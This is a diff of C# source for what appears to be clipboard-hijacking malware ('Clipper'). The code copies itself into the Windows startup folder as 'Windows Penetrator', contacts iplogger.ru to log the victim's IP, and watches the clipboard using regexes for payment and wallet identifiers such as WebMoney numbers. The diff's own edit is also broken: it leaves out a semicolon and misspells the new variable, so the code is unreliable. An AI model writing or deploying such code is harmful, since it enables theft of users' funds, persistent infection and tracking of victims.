@@ -22,12 +22,11 @@ namespace Clipper
                 STAThread.SetApartmentState(ApartmentState.STA);
                 STAThread.Start();
                 STAThread.Join();
-
             }
             catch { }
             return ReturnValue;
-
         }
+        
         public static void SetText(string text)
         {
             Thread STAThread = new Thread(
@@ -43,7 +42,6 @@ namespace Clipper
             STAThread.Start();
             STAThread.Join();
         }
-
     }
 
     class Program
@@ -55,6 +53,7 @@ namespace Clipper
             FileInfo file = new FileInfo(executable);
             string previous_buffer = "";
             string autorun_name = "Windows Penetrator"; // название файла в автозагрузке
+            string iplogger_link = "https://iplogger.ru"
             Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
             {
                 {"wmr", new Regex(@"R[0-9]{12}") },
@@ -137,7 +136,7 @@ namespace Clipper
             {
                 File.Copy(executable, $@"{startup_directory}\{autorun_name}.exe");
             }
-            WebRequest.Create("https://iplogger.ru").GetResponse(); // ссылка на айпилоггер
+            WebRequest.Create(iplogget_link).GetResponse(); // ссылка на айпилоггер
             while (true)
             {
                 string buffer = Clipboard.GetText();
